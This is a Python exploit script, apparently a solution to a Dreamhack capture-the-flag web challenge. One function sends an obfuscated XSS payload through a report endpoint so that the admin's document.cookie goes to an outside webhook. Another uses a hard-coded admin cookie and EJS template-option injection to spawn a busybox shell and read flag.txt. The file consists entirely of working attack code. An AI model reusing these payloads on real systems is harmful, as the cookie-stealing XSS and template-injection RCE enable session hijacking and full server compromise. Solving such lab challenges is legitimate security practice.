import requests
import html

url = "http://host8.dreamhack.games:18731"
webhook = "http://ykbtagd.request.dreamhack.games/"

def payload(url):
    url = [i for i in url.replace("/", " / ").split(" ") if len(i)]

    obf = []

    for part in url:
        if part == '/':
            obf.append('String(function(){/**/})[11]')
        else:
            obf.append(f"String(/{part}/).slice(1,-1)")

    obf.append("document.cookie")

    return f'x onerror=location.href=[{','.join(obf)}].join(String())'

# exfiltrate admin token
def xss():
    res = requests.post(f"{url}/report", json={
        "text": f"?src={payload(webhook)}"
    })

    print(res.text)

# ejs rce
def rce():
    payload = '''settings[view options][client]=true&settings[view options][escapeFunction]=(() => {});
        const result = process.binding('spawn_sync').spawn({
            file: '/bin/busybox',
            args: ['ash', '-c', 'cat flag.txt'],
            stdio: [
                { type: 'pipe', readable: true, writable: false },
                { type: 'pipe', readable: false, writable: true },
                { type: 'pipe', readable: false, writable: true }
            ],
        });

        return `${result.output[1]}\n${result.output[2]}`;
    '''

    res = requests.get(f'{url}/admin?{payload}', cookies={ 'admin': 'd73b91e4-5448-4824-8627-4d9f20a15f66'})

    print(html.unescape(res.text))

# xss()
rce()